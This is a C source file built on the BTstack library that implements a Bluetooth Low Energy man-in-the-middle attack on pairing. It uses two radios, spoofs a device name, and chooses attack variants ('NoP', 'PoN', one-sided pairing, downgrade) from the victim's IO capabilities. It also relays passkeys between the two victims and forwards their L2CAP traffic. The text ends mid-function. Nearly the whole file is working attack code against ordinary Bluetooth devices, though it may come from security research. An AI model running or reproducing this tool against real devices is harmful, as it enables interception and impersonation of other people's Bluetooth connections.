#define __BTSTACK_FILE__ "main.c"
#define _POSIX_SOURCE

//#define DEBUG_IPC

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>

#include "btstack_debug.h"
#include "btstack_event.h"
#include "btstack_link_key_db_fs.h"
#include "btstack_memory.h"
#include "btstack_run_loop.h"
#include "btstack_run_loop_posix.h"
#include "hal_led.h"
#include "hci.h"
#include "hci_dump.h"
#include "btstack_stdin.h"
#include "btstack_audio.h"
#include "btstack_tlv_posix.h"
#include "bluetooth_data_types.h"
#include "bluetooth_company_id.h"
#include "../chipset/zephyr/btstack_chipset_zephyr.h"
#include "ble/le_device_db.h"
#include "ble/att_server.h"

#include <libusb.h>
#include <sys/wait.h>
#include <sys/types.h>

#include "profiles.h"
#include "btstack_config.h"

#define TLV_DB_PATH_PREFIX "/tmp/btstack_"
#define TLV_DB_PATH_POSTFIX ".tlv"
#define USB_MAX_PATH_LEN 7
#define FIXED_PASSKEY 123456
#define REMOTE_SERVICE 0x1111
#define MAX_NAME_LEN 31 - 9

enum attack_variant
{
	NoP, PoN, None, WaitForVictimResponder, OnesidedPairing
};
int selected_attack_variant = None;

enum pairing_role
{
	Resp, Init, NoRole
};
int selected_pairing_role = None;
pid_t cpid = 1;

int responder_rx;
int responder_tx;
int initiator_rx;
int initiator_tx;

bd_addr_t attacked_responder_mac;
uint8_t expect_resp_addr = 0;
static char tlv_db_path[100];
static const btstack_tlv_t * tlv_impl;
static btstack_tlv_posix_t   tlv_context;
static bd_addr_t             local_addr;
static uint16_t initial_credits = L2CAP_LE_AUTOMATIC_CREDITS;
hci_con_handle_t connection_handle;
uint16_t connection_id;

int relay_mode_enabled;
static uint8_t data_channel_buffer[TEST_PACKET_SIZE];
static uint8_t my_packet_to_forward[TEST_PACKET_SIZE];
static uint8_t partner_packet_to_forward[TEST_PACKET_SIZE];
static size_t sizeof_my_packet_to_forward;
static size_t sizeof_partner_packet_to_forward;

static btstack_packet_callback_registration_t hci_event_callback_registration;
static btstack_packet_callback_registration_t sm_event_callback_registration;

void (*ipc_read)(char *buf, size_t size, char* log);
void (*ipc_write)(char *buf, size_t size, char* log);

static const uint8_t read_static_address_command_complete_prefix[] = { 0x0e, 0x1b, 0x01, 0x09, 0xfc };
static bd_addr_t static_address;
static int using_static_address;

/* Predefines */
int btstack_main(int argc, const char * argv[]);

static char* prnt_pairing_role(void)
{
	return selected_pairing_role == Resp ? "RESP" : "INIT";
}

static void l2cap_mitm_initiator_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);

	bd_addr_t event_address;
	uint16_t psm;
	uint16_t temp_connection_id;
	hci_con_handle_t handle;
	char buf[1];

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet))
			{
				case L2CAP_EVENT_LE_INCOMING_CONNECTION:
					printf("%s: L2CAP incoming connection\n", prnt_pairing_role());
					psm = l2cap_event_le_incoming_connection_get_psm(packet);
					temp_connection_id = l2cap_event_le_incoming_connection_get_local_cid(packet);

					if (psm != TSPX_le_psm)
						break;
					printf("%s: L2CAP Accepting incoming LE connection request for 0x%02x, PSM %02x\n", prnt_pairing_role(), temp_connection_id, psm);
					l2cap_le_accept_connection(temp_connection_id, data_channel_buffer, sizeof(data_channel_buffer), initial_credits);
					break;

				case L2CAP_EVENT_LE_CHANNEL_OPENED:
					l2cap_event_le_channel_opened_get_address(packet, event_address);
					psm = l2cap_event_le_channel_opened_get_psm(packet);
					temp_connection_id = l2cap_event_le_channel_opened_get_local_cid(packet);
					handle = l2cap_event_le_channel_opened_get_handle(packet);
					if (packet[2] == 0)
					{
						printf("%s: L2CAP LE Data Channel successfully opened: %s, handle 0x%02x, psm 0x%02x, local connection_id 0x%02x, remote connection_id 0x%02x\n", prnt_pairing_role(), bd_addr_to_str(event_address), handle, psm, temp_connection_id,  little_endian_read_16(packet, 15));
						connection_id = temp_connection_id;
					}
					else
					{
						printf("%s: L2CAP LE Data Channel connection to device %s failed. status code %u\n", prnt_pairing_role(), bd_addr_to_str(event_address), packet[2]);
					}

					if (selected_attack_variant != OnesidedPairing)
						ipc_write(buf, 1, "L2CAP channel opened");

					if (selected_attack_variant == PoN)
					{
						ipc_read(buf, 1, "wait for resp to open L2CAP channel");
					}
					relay_mode_enabled = 1;
					break;

				case L2CAP_EVENT_LE_CHANNEL_CLOSED:
					printf("%s: L2CAP LE Data Channel closed\n", prnt_pairing_role());
					connection_id = 0;
					break;

				case L2CAP_EVENT_LE_CAN_SEND_NOW:
					if (sizeof_partner_packet_to_forward)
						l2cap_le_send_data(connection_id, (uint8_t *)partner_packet_to_forward, sizeof_partner_packet_to_forward);
					break;
			}
			break;

		case L2CAP_DATA_PACKET:
			printf("%s: Received data: %s\n \t-> Forwarding\n", prnt_pairing_role(), packet);
			if (sizeof_my_packet_to_forward != 0)
			{
				printf("Clash\n");
#ifdef DEBUG_IPC
				raise(SIGINT);
#endif
			}
			sizeof_my_packet_to_forward = size;
			memcpy(my_packet_to_forward, packet, size);
			break;
	}
}

static void l2cap_mitm_responder_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);

	bd_addr_t event_address;
	uint16_t psm;
	uint16_t temp_connection_id;
	hci_con_handle_t handle;
	char buf[1];

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet))
			{
				case L2CAP_EVENT_LE_INCOMING_CONNECTION:
					printf("%s: L2CAP incoming connection\n", prnt_pairing_role());
					psm = l2cap_event_le_incoming_connection_get_psm(packet);
					temp_connection_id = l2cap_event_le_incoming_connection_get_local_cid(packet);

					if (psm != TSPX_le_psm)
						break;

					printf("%s: L2CAP Accepting incoming LE connection request for 0x%02x, PSM %02x\n", prnt_pairing_role(), temp_connection_id, psm);
					l2cap_le_accept_connection(temp_connection_id, data_channel_buffer, sizeof(data_channel_buffer), initial_credits);
					break;

				case L2CAP_EVENT_LE_CHANNEL_OPENED:
					l2cap_event_le_channel_opened_get_address(packet, event_address);
					psm = l2cap_event_le_channel_opened_get_psm(packet);
					temp_connection_id = l2cap_event_le_channel_opened_get_local_cid(packet);
					handle = l2cap_event_le_channel_opened_get_handle(packet);
					if (packet[2] == 0)
					{
						printf("%s: L2CAP LE Data Channel successfully opened: %s, handle 0x%02x, psm 0x%02x, local connection_id 0x%02x, remote connection_id 0x%02x\n", prnt_pairing_role(), bd_addr_to_str(event_address), handle, psm, temp_connection_id,  little_endian_read_16(packet, 15));
						connection_id = temp_connection_id;
					}
					else
					{
						printf("%s: L2CAP LE Data Channel connection to device %s failed. status code %u\n", prnt_pairing_role(), bd_addr_to_str(event_address), packet[2]);
					}

					/* Passkey Entry / Numeric Comparison finished  */
					if (selected_attack_variant != OnesidedPairing)
						ipc_write(buf, 1, "L2CAP channel opened");

					if (selected_attack_variant == NoP)
					{
						ipc_read(buf, 1, "waiting for init to open L2CAP channel");
					}
					relay_mode_enabled = 1;
					break;

				case L2CAP_EVENT_LE_CHANNEL_CLOSED:
					printf("%s: L2CAP LE Data Channel closed\n", prnt_pairing_role());
					connection_id = 0;
					break;

				case L2CAP_EVENT_LE_CAN_SEND_NOW:
					printf("%s: L2CAP Can send now\n", prnt_pairing_role());
					if (sizeof_partner_packet_to_forward)
						l2cap_le_send_data(connection_id, (uint8_t *)partner_packet_to_forward, sizeof_partner_packet_to_forward);
					break;
			}
			break;

		case L2CAP_DATA_PACKET:
			printf("%s: Received data: %s\n \t-> Forwarding\n", prnt_pairing_role(), packet);
			if (sizeof_my_packet_to_forward != 0)
			{
				printf("Clash\n");
#ifdef DEBUG_IPC
				raise(SIGINT);
#endif
			}
			sizeof_my_packet_to_forward = size;
			memcpy(my_packet_to_forward, packet, size);
			break;
	}
}

static void initiator_sm_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	char buf[1];
	uint32_t passkey;

	if (packet_type != HCI_EVENT_PACKET)
		return;

	switch(hci_event_packet_get_type(packet))
	{
		case SM_EVENT_JUST_WORKS_REQUEST:
			sm_just_works_confirm(sm_event_just_works_request_get_handle(packet));
			printf("%s: confirmed Just works\n", prnt_pairing_role());
			break;

		case SM_EVENT_NUMERIC_COMPARISON_REQUEST:
			printf("%s: Confirming numeric comparison: \e[31m%d\e[0m\n\n", prnt_pairing_role(), sm_event_numeric_comparison_request_get_passkey(packet));

			if (selected_attack_variant == NoP)
			{
				/* pass Va to responder */
				passkey = sm_event_numeric_comparison_request_get_passkey(packet);
				printf("%s: using passkey %d\n", prnt_pairing_role(), passkey);
				ipc_write((char*) &passkey, sizeof(uint32_t), "transmitting passkey");
				/* wait for passkey finish */
				ipc_read(buf, 1, "waiting for resp to complete passkey entry");
			}

			sm_numeric_comparison_confirm(sm_event_passkey_display_number_get_handle(packet));
			printf("%s: confirmed numeric comparison\n", prnt_pairing_role());
			break;

		case SM_EVENT_PASSKEY_DISPLAY_NUMBER:
			printf("%s: Display Passkey: %d\n", prnt_pairing_role(), sm_event_passkey_display_number_get_passkey(packet));
			break;

		case SM_EVENT_PASSKEY_INPUT_NUMBER:
			printf("%s: Passkey Input requested\n", prnt_pairing_role());
			printf("%s: Sending fixed passkey %d\n", prnt_pairing_role(), FIXED_PASSKEY);
			sm_passkey_input(sm_event_passkey_input_number_get_handle(packet), FIXED_PASSKEY);
			break;

		case SM_EVENT_PAIRING_COMPLETE:
			switch (sm_event_pairing_complete_get_status(packet))
			{
				case ERROR_CODE_SUCCESS:
					printf("%s: Pairing complete, success\n", prnt_pairing_role());

					//printf("%s: Establishing L2CAP channel\n", prnt_pairing_role());
					l2cap_le_create_channel(&l2cap_mitm_initiator_packet_handler, connection_handle, TSPX_le_psm, data_channel_buffer, sizeof(data_channel_buffer), L2CAP_LE_AUTOMATIC_CREDITS, LEVEL_2, &connection_id);
					break;
				case ERROR_CODE_CONNECTION_TIMEOUT:
					printf("%s: Pairing failed, timeout\n", prnt_pairing_role());
					break;
				case ERROR_CODE_REMOTE_USER_TERMINATED_CONNECTION:
					printf("%s: Pairing failed, disconnected\n", prnt_pairing_role());
					break;
				case ERROR_CODE_AUTHENTICATION_FAILURE:
					printf("%s: Pairing failed, reason = %u\n", prnt_pairing_role(), sm_event_pairing_complete_get_reason(packet));
					break;
				default:
					break;
			}
			break;
	}
}


static void responder_sm_packet_handler (uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	bd_addr_t addr;
	char buf[1];
	uint32_t passkey;

	switch (packet_type)
	{
		case HCI_EVENT_PACKET:
			switch (hci_event_packet_get_type(packet)) {
				case HCI_EVENT_LE_META:
					switch (hci_event_le_meta_get_subevent_code(packet)) {
						case HCI_SUBEVENT_LE_CONNECTION_COMPLETE:
							// setup new
							printf("%s: Connection complete\n", prnt_pairing_role());

							connection_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
							sm_send_security_request(connection_handle);
							break;
					}
					break;
				case SM_EVENT_JUST_WORKS_REQUEST:
					printf("%s: Just Works requested\n", prnt_pairing_role());
					sm_just_works_confirm(sm_event_just_works_request_get_handle(packet));
					break;
				case SM_EVENT_NUMERIC_COMPARISON_REQUEST:
					printf("%s: Confirming numeric comparison: %d\n", prnt_pairing_role(), sm_event_numeric_comparison_request_get_passkey(packet));

					if (selected_attack_variant != OnesidedPairing)
					{
						/* pass Va to responder */
						passkey = sm_event_numeric_comparison_request_get_passkey(packet);
						printf("%s: using passkey %d\n", prnt_pairing_role(), passkey);
						ipc_write((char*) &passkey, sizeof(uint32_t), "transmitting passkey");
						/* wait for passkey finish */
						ipc_read(buf, 1, "waiting for init to complete passkey entry");
					}

					sm_numeric_comparison_confirm(sm_event_passkey_display_number_get_handle(packet));
					printf("%s: confirmed numeric comparison\n", prnt_pairing_role());

					break;
				case SM_EVENT_PASSKEY_DISPLAY_NUMBER:
					printf("%s: Display Passkey: %d\n", prnt_pairing_role(), sm_event_passkey_display_number_get_passkey(packet));
					break;
				case SM_EVENT_IDENTITY_CREATED:
					sm_event_identity_created_get_identity_address(packet, addr);
					printf("%s: Identity created\n", prnt_pairing_role());
					break;
				case SM_EVENT_IDENTITY_RESOLVING_SUCCEEDED:
					sm_event_identity_resolving_succeeded_get_identity_address(packet, addr);
					printf("%s: Identity resolved\n", prnt_pairing_role());
					break;
				case SM_EVENT_IDENTITY_RESOLVING_FAILED:
					sm_event_identity_created_get_address(packet, addr);
					printf("%s: Identity resolving failed\n", prnt_pairing_role());
					break;
				case SM_EVENT_PAIRING_COMPLETE:
					switch (sm_event_pairing_complete_get_status(packet))
					{
						case ERROR_CODE_SUCCESS:
							printf("%s: Pairing complete, success\n", prnt_pairing_role());
							break;
						case ERROR_CODE_CONNECTION_TIMEOUT:
							printf("%s: Pairing failed, timeout\n", prnt_pairing_role());
							break;
						case ERROR_CODE_REMOTE_USER_TERMINATED_CONNECTION:
							printf("%s: Pairing faileed, disconnected\n", prnt_pairing_role());
							break;
						case ERROR_CODE_AUTHENTICATION_FAILURE:
							printf("%s: Pairing failed, reason = %u\n", prnt_pairing_role(), sm_event_pairing_complete_get_reason(packet));
							break;
					}
					break;
			}
			break;
	}
}

static void initiator_hci_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);
	bd_addr_t address;

	if (packet_type != HCI_EVENT_PACKET)
		return;

	switch (hci_event_packet_get_type(packet))
	{
		case BTSTACK_EVENT_STATE:
			// BTstack activated, get started
			if (btstack_event_state_get_state(packet) != HCI_STATE_WORKING)
				break;

			printf("%s: Start scanning!\n", prnt_pairing_role());
			gap_set_scan_parameters(1, 0x0030, 0x0030);
			gap_start_scan();
			break;

		case GAP_EVENT_ADVERTISING_REPORT:
			gap_event_advertising_report_get_address(packet, address);
			uint8_t address_type = gap_event_advertising_report_get_address_type(packet);

			if (memcmp(address, attacked_responder_mac, sizeof(bd_addr_t)) == 0)
			{
				printf("%s: Found targeted remote (%s) with UUID %04x\n", prnt_pairing_role(), bd_addr_to_str(address), REMOTE_SERVICE);
				gap_stop_scan();
				printf("%s: Connecting to attack target responder\n", prnt_pairing_role());
				gap_connect(address, address_type);
			}
			break;

		case HCI_EVENT_LE_META:
			// wait for connection complete
			if (hci_event_le_meta_get_subevent_code(packet) != HCI_SUBEVENT_LE_CONNECTION_COMPLETE)
				break;

			connection_handle = hci_subevent_le_connection_complete_get_connection_handle(packet);
			printf("%s: Connection complete\n", prnt_pairing_role());

			// start pairing
			sm_request_pairing(connection_handle);
			break;

		case HCI_EVENT_ENCRYPTION_CHANGE:
			connection_handle = hci_event_encryption_change_get_connection_handle(packet);
			printf("%s: Connection encrypted: %u\n", prnt_pairing_role(), hci_event_encryption_change_get_encryption_enabled(packet));
			break;
	}
}


static void responder_hci_packet_handler(uint8_t packet_type, uint16_t channel, uint8_t *packet, uint16_t size)
{
	UNUSED(channel);
	UNUSED(size);

	if (packet_type != HCI_EVENT_PACKET)
		return;

	switch (hci_event_packet_get_type(packet))
	{
		case BTSTACK_EVENT_STATE:
			if (btstack_event_state_get_state(packet) != HCI_STATE_WORKING)
				break;

			gap_local_bd_addr(local_addr);
			if (using_static_address)
				memcpy(local_addr, static_address, 6);

			printf("%s BThack up and running on %s.\n", prnt_pairing_role(), bd_addr_to_str(local_addr));
			strcpy(tlv_db_path, TLV_DB_PATH_PREFIX);
			strcat(tlv_db_path, bd_addr_to_str(local_addr));
			strcat(tlv_db_path, TLV_DB_PATH_POSTFIX);
			tlv_impl = btstack_tlv_posix_init_instance(&tlv_context, tlv_db_path);
			btstack_tlv_set_instance(tlv_impl, &tlv_context);
			break;

		case HCI_EVENT_COMMAND_COMPLETE:
			if (memcmp(packet, read_static_address_command_complete_prefix, sizeof(read_static_address_command_complete_prefix)) == 0)
			{
				reverse_48(&packet[7], static_address);
				gap_random_address_set(static_address);
				using_static_address = 1;
			}
			break;
	}
}

static void sigint_handler(int param)
{
	UNUSED(param);

	printf("%s: CTRL-C - SIGINT received, shutting down..\n", prnt_pairing_role());
	log_info("%s sigint_handler: shutting down", prnt_pairing_role());

	btstack_stdin_reset();

	hci_power_control(HCI_POWER_OFF);
	hci_close();

	log_info("%s: Good bye, see you.\n", prnt_pairing_role());

	if (selected_pairing_role == Resp)
		kill(cpid, SIGKILL);

	raise(SIGINT);
}

static void initiator_received_pairing_feature_exchange(stk_generation_method_t method)
{
	switch (method)
	{
		case PK_RESP_INPUT:
		case PK_BOTH_INPUT:
			switch (selected_attack_variant)
			{
				/* everything is ok */
				case WaitForVictimResponder:
					printf("%s: PoN selected\n", prnt_pairing_role());
					selected_attack_variant = PoN;
				case OnesidedPairing:
				case PoN:
					break;

				/* something went wrong */
				case NoP:
					printf("%s: performing PASSKEY ENTRY during NoP -> changing to onesided pairing\n", prnt_pairing_role());
					selected_attack_variant = OnesidedPairing;
					// TODO reconnect & try downgrade
					break;
			}
			break;

		case NUMERIC_COMPARISON:
			switch (selected_attack_variant)
			{
				/* everything is ok */
				case WaitForVictimResponder:
					printf("%s: NoP selected\n", prnt_pairing_role());
					selected_attack_variant = NoP;
				case OnesidedPairing:
				case NoP:
					break;

				/* something went wrong */
				case PoN:
					printf("%s: performing NUMERIC COMPARISON during PoN -> changing to onesided pairing\n", prnt_pairing_role());
					selected_attack_variant = OnesidedPairing;
					// TODO reconnect & try downgrade
					break;
			}
			break;

		case PK_INIT_INPUT:
			printf("%s: victim responder provided iocaps DISPLAY_ONLY\n", prnt_pairing_role());
			selected_attack_variant = OnesidedPairing;
			// TODO reconnect & try downgrade
			break;

		case JUST_WORKS:
			printf("%s: performing onsided pairing\n", prnt_pairing_role());
			selected_attack_variant = OnesidedPairing;
			break;

		case OOB:
			printf("%s: OOB selected\n", prnt_pairing_role());
			raise(SIGINT);
			break;
	}

	ipc_write((char*) &selected_attack_variant, sizeof(selected_attack_variant), "ack selected attack variant");
}

static void responder_set_custom_pairing_feature_exchange(uint8_t victim_iocap)
{
	switch (victim_iocap)
	{
		case IO_CAPABILITY_KEYBOARD_DISPLAY:
			printf("%s: victim iocap KEYBOARD_DISPLAY -> waiting for victim responder\n", prnt_pairing_role());
			selected_attack_variant = WaitForVictimResponder;
			break;
		case IO_CAPABILITY_DISPLAY_YES_NO:
			printf("%s: victim iocap DISPLAY_YES_NO -> performing PoN [DISPLAY_YES_NO]\n", prnt_pairing_role());
			selected_attack_variant = PoN;
			sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_YES_NO);
			sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
			break;
		case IO_CAPABILITY_KEYBOARD_ONLY:
			printf("%s: victim iocap KEYBOARD_ONLY -> performing NoP [DISPLAY_ONLY]\n", prnt_pairing_role());
			selected_attack_variant = NoP;
			sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_ONLY);
			sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
			break;
		case IO_CAPABILITY_DISPLAY_ONLY:
		case IO_CAPABILITY_NO_INPUT_NO_OUTPUT:
			printf("%s: victim iocap %s trying onesided pairing\n", prnt_pairing_role(), victim_iocap == IO_CAPABILITY_DISPLAY_ONLY ? "DISPLAY_ONLY" : "NO_INPUT_NO_OUTPUT");
			selected_attack_variant = OnesidedPairing;
			sm_set_io_capabilities(IO_CAPABILITY_NO_INPUT_NO_OUTPUT);
			sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION);
			break;
		default:
			printf("%s: invalid iocap\n", prnt_pairing_role());
			raise(SIGINT);
	}

	ipc_write((char*) &selected_attack_variant, sizeof(selected_attack_variant), "transmitting selected attack variant");
	ipc_read((char*) &selected_attack_variant, sizeof(selected_attack_variant), "waiting for init to ack selected attack variant");

	switch (selected_attack_variant)
	{
		case PoN:
			printf("%s: performing PoN [DISPLAY_YES_NO]\n", prnt_pairing_role());
			sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_YES_NO);
			sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
			break;
		case NoP:
			printf("%s: performing NoP [DISPLAY_ONLY]\n", prnt_pairing_role());
			sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_ONLY);
			sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
			break;
		case OnesidedPairing:
			//sm_set_io_capabilities(IO_CAPABILITY_KEYBOARD_DISPLAY);
			printf("%s: performing onesided paring\n", prnt_pairing_role());
			sm_set_io_capabilities(IO_CAPABILITY_NO_INPUT_NO_OUTPUT);
			sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION);
			break;
		default:
			printf("%s: Attack not possible\n", prnt_pairing_role());
			raise(SIGINT);
	}
}

static void set_custom_passkey(uint32_t* tk)
{
	printf("%s: old tk %d\n", prnt_pairing_role(), *tk);

	/* Waiting for Va */
	ipc_read((char*) tk, sizeof(uint32_t), "waiting for Va");

	if (*tk < 100000)
	{
		printf("%s: passkey has leading 0, abort\n", prnt_pairing_role());
		raise(SIGINT);
	}
	printf("%s: new tk %d\n", prnt_pairing_role(), *tk);
}

static void forward_packages(void)
{
        if (!relay_mode_enabled)
                return;

        /* Synchronize with other process */
        ipc_write((char *)&sizeof_my_packet_to_forward, sizeof(size_t), "transmitting size of packet");
        ipc_write((char *)my_packet_to_forward, sizeof_my_packet_to_forward, "transmitting packet");
        sizeof_my_packet_to_forward = 0;

        /* Receive what to forward (if any) */
        ipc_read((char *)&sizeof_partner_packet_to_forward, sizeof(ssize_t), "waiting for packet size");
        if (sizeof_partner_packet_to_forward > 0)
        {
                ipc_read((char *)partner_packet_to_forward, sizeof_partner_packet_to_forward, "waiting for packet");
                l2cap_le_request_can_send_now_event(connection_id);
        }
}

static void register_mitm_options(void)
{
	printf("%s: registering callbacks\n", prnt_pairing_role());
	struct SmMitmOptions* mitm_options = calloc(1, sizeof(struct SmMitmOptions));
	mitm_options->responder_set_custom_passkey_callback = &set_custom_passkey;
	if (selected_pairing_role == Resp)
		mitm_options->responder_set_custom_pairing_feature_exchange_callback = &responder_set_custom_pairing_feature_exchange;
	if (selected_pairing_role == Init)
		mitm_options->initiator_received_pairing_feature_exchange_callback = &initiator_received_pairing_feature_exchange;
	sm_register_mitm_options(mitm_options);
}

static void initiator_ipc_read(char *buf, size_t size, char* log)
{
#ifndef DEBUG_IPC
	UNUSED(log);
#else
	printf("%s: ipc_read block | %s\n", prnt_pairing_role(), log);
#endif
	size_t len = read(initiator_rx, buf, size);
	if (len != size)
	{
		printf("%s: IPC read error, got %zu bytes while trying to read %zu\n", prnt_pairing_role(), len, size);
#ifdef DEBUG_IPC
		raise(SIGINT);
#endif
	}

#ifdef DEBUG_IPC
	printf("%s: ipc_read release | %s\n", prnt_pairing_role(), log);
#endif
}

static void initiator_ipc_write(char *buf, size_t size, char* log)
{
#ifndef DEBUG_IPC
	UNUSED(log);
#else
	printf("%s: ipc_write | %s\n", prnt_pairing_role(), log);
#endif
	if ((size_t) write(initiator_tx, buf, size) != size)
	{
		printf("%s: IPC write error\n", prnt_pairing_role());
#ifdef DEBUG_IPC
		raise(SIGINT);
#endif
	}
}

static void responder_ipc_read(char *buf, size_t size, char* log)
{
#ifndef DEBUG_IPC
	UNUSED(log);
#else
	printf("%s: ipc_read block | %s\n", prnt_pairing_role(), log);
#endif
	size_t len = read(responder_rx, buf, size);
	if (len != size)
	{
		printf("%s: IPC read error, got %zu bytes while trying to read %zu\n", prnt_pairing_role(), len, size);
#ifdef DEBUG_IPC
		raise(SIGINT);
#endif
	}
#ifdef DEBUG_IPC
	printf("%s: ipc_read release | %s\n", prnt_pairing_role(), log);
#endif
}

static void responder_ipc_write(char *buf, size_t size, char* log)
{
#ifndef DEBUG_IPC
	UNUSED(log);
#else
	printf("%s: ipc_write | %s\n", prnt_pairing_role(), log);
#endif
	if ((size_t) write(responder_tx, buf, size) != size)
	{
		printf("%s: IPC write error\n", prnt_pairing_role());
#ifdef DEBUG_IPC
		raise(SIGINT);
#endif
	}
}

int main(int argc, const char * argv[])
{
	char pklg_path[100];
	uint8_t initiator_usb_device_id;
	uint8_t responder_usb_device_id;
	char address_str[100];
	uint8_t *adv_data;
	uint8_t adv_data_len;
	uint8_t local_name_len;
	int pipe_fd[2];
	char buf;

	/* Parse arguments */
	if (argc < 4)
	{
		printf("Error: Too few arguments provided\n");
		printf("Usage:./%s initiator_device_id responder_device_id mitm_responder_name (for scanning: attacked_responder_mac[aa:bb:cc:dd:ee:ff])\n", argv[0]);
		raise(SIGINT);
	}

	initiator_usb_device_id = strtol(argv[1], 0, 10);
	responder_usb_device_id = strtol(argv[2], 0, 10);
	local_name_len = strlen(argv[3]);

	if (local_name_len > MAX_NAME_LEN)
	{
		printf("Error: Provided MitM-Responder name too long (max %d)\n", MAX_NAME_LEN);
		raise(SIGINT);
	}

	/* Construcing advertisement packet */
	adv_data_len = local_name_len + 9;
	adv_data = malloc(adv_data_len);
	adv_data[0] = 0x02;
	adv_data[1] = BLUETOOTH_DATA_TYPE_FLAGS;
	adv_data[2] = 0x06;
	adv_data[3] = local_name_len + 1;
	adv_data[4] = BLUETOOTH_DATA_TYPE_COMPLETE_LOCAL_NAME;
	memcpy(adv_data + 5, argv[3], local_name_len);
	adv_data[local_name_len + 5 + 1] = 0x03;
	adv_data[local_name_len + 5 + 2] = BLUETOOTH_DATA_TYPE_INCOMPLETE_LIST_OF_16_BIT_SERVICE_CLASS_UUIDS;
	adv_data[local_name_len + 5 + 3] = 0x11;
	adv_data[local_name_len + 5 + 4] = 0x11;

	if (argc == 5)
	{
		if (sscanf_bd_addr(argv[4], attacked_responder_mac) == 0)
		{
			printf("Error: MAC provided appears invalid\n");
			raise(SIGINT);
		}
	}
	else
	{
		expect_resp_addr = 1;
	}

	signal(SIGINT, sigint_handler);

	printf("Forking Initiator process\n");
	pipe(pipe_fd);
	responder_tx = pipe_fd[1];
	initiator_rx = pipe_fd[0];
	pipe(pipe_fd);
	initiator_tx = pipe_fd[1];
	responder_rx = pipe_fd[0];
	if ((cpid = fork()))
		selected_pairing_role = Resp;
	else
		selected_pairing_role = Init;

	/* Turn on line buffering for stdout (interaction with python scripts) */
	setvbuf(stdout, 0, _IOLBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	btstack_memory_init();
	/* Registering loop callback for packet forwarding later */
	btstack_run_loop_posix_register_loop_callback(forward_packages);
	btstack_run_loop_init(btstack_run_loop_posix_get_instance());

	if (selected_pairing_role == Init)
		hci_transport_usb_set_address(initiator_usb_device_id);
	else
		hci_transport_usb_set_address(responder_usb_device_id);

	/* Logger */
	if (selected_pairing_role == Init)
		strcpy(pklg_path, "/tmp/hci_dump_initiator");
	else
		strcpy(pklg_path, "/tmp/hci_dump_responder");
	strcat(pklg_path, ".pklg");
	printf("Packet Log: %s\n", pklg_path);
	hci_dump_open(pklg_path, HCI_DUMP_PACKETLOGGER);

	hci_init(hci_transport_usb_instance(), NULL);

	if (selected_pairing_role == Init) /* Initiator (child) */
	{
		/* Configure InterProcessComms */
		ipc_read = initiator_ipc_read;
		ipc_write = initiator_ipc_write;

		l2cap_init();
		le_device_db_init();

		register_mitm_options();

		sm_init();

		/* setup ATT server */
		att_server_init(initiator_profile_data, NULL, NULL);

		// register handler
		hci_event_callback_registration.callback = &initiator_hci_packet_handler;
		hci_add_event_handler(&hci_event_callback_registration);

		sm_event_callback_registration.callback = &initiator_sm_packet_handler;
		sm_add_event_handler(&sm_event_callback_registration);

		hci_power_control(HCI_POWER_ON);
		printf("%s: Initialized\n", prnt_pairing_role());

		if (expect_resp_addr)
		{
			/* Wait for real Initiator connecting to our Responder */
			ipc_read(&buf, 1, "waiting for victim init to connect");
			printf("%s: Please provide responder MAC:\n", prnt_pairing_role());
			fgets(address_str, 100, stdin);
			if (sscanf_bd_addr(address_str, attacked_responder_mac) == 0)
			{
				printf("MAC provided appears invalid\n");
				raise(SIGINT);
			}

			printf("%s: Searching for %s\n", prnt_pairing_role(), address_str);
		}

		/* wait for iocap */
		ipc_read((char*) &selected_attack_variant, sizeof(selected_attack_variant), "waiting for resp to select attack variant");

		switch (selected_attack_variant)
		{
			case PoN:
				sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_ONLY);
				sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
				printf("%s: performing PoN [KEYBOARD_ONLY]\n", prnt_pairing_role());
				break;
			case NoP:
				sm_set_io_capabilities(IO_CAPABILITY_DISPLAY_YES_NO);
				sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
				printf("%s: performing NoP [DISPLAY_YES_NO]\n", prnt_pairing_role());
				break;
			case WaitForVictimResponder:
				sm_set_io_capabilities(IO_CAPABILITY_KEYBOARD_DISPLAY);
				sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION|SM_AUTHREQ_MITM_PROTECTION);
				printf("%s: Responder is waiting for victim responder iocap -> resolving\n", prnt_pairing_role());
				break;
			case OnesidedPairing:
				sm_set_io_capabilities(IO_CAPABILITY_NO_INPUT_NO_OUTPUT);
				sm_set_authentication_requirements(SM_AUTHREQ_SECURE_CONNECTION);
				printf("%s: Responder is trying onesided pairing -> clearing MITM-Bit, Just Works allowed -> trying downgrade attack\n", prnt_pairing_role());
				break;
			case None:
				printf("%s: attack variant is None\n", prnt_pairing_role());
